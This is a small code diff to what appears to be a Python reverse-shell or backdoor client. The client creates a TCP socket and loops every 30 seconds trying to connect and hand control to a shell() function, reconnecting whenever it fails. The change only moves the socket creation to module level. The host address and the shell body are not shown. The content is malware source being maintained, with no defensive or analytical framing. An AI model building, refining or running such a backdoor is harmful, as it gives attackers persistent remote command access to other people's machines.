@@ -34,8 +34,7 @@ def shell():
 
 
 def connection():
-	global sock
-	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
 	while True:
 		time.sleep(30)
 		try:
@@ -43,6 +42,7 @@ def connection():
 			shell()
 		except:
 			connection()
-		
+
+sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 connection()
 sock.close()
